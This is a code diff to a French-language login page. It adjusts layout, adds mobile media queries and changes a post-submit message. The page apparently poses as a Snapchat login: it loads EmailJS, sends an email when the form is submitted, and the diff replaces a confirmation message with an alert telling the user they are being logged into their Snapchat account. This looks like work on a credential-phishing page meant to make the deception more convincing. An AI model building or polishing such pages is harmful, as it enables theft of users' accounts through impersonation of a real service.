@@ -107,8 +107,8 @@
     }
     .signature {
       position: absolute;
-      bottom: -100px;
-      right: -250px;
+      bottom: 10px;
+      right: 10px;
       text-align: right;
       display: flex;
       align-items: center; /* Aligner verticalement l'image et le texte */
@@ -124,6 +124,25 @@
       margin-left: 5px;
       vertical-align: middle;
       font-family: 'Press Start 2P', cursive; /* Police de caractère de thème jeu */
+    }
+    /* Media queries pour responsive design */
+    @media (max-width: 600px) {
+      .container {
+        width: 100%; /* Utiliser toute la largeur de l'écran */
+        padding: 10px;
+      }
+      .field input {
+        font-size: 14px; /* Réduire la taille de la police pour les petits écrans */
+      }
+      .field input[type="submit"] {
+        width: 90%; /* Augmenter la largeur du bouton pour les petits écrans */
+      }
+      h2, h3 {
+        font-size: 16px; /* Réduire la taille de la police pour les petits écrans */
+      }
+      .forgot-password, .link {
+        font-size: 14px; /* Réduire la taille de la police pour les petits écrans */
+      }
     }
   </style>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
@@ -181,7 +200,7 @@
         .then(() => {
           console.log('Email envoyé avec succès');
           btn.value = 'Connexion';
-          document.getElementById('confirmation').style.display = 'block';
+          alert('Vous allez être connecté à votre compte Snapchat'); // Alerte à la place du message de confirmation
         }, (err) => {
           console.error('Erreur lors de l\'envoi de l\'email :', err);
           btn.value = 'Connexion';
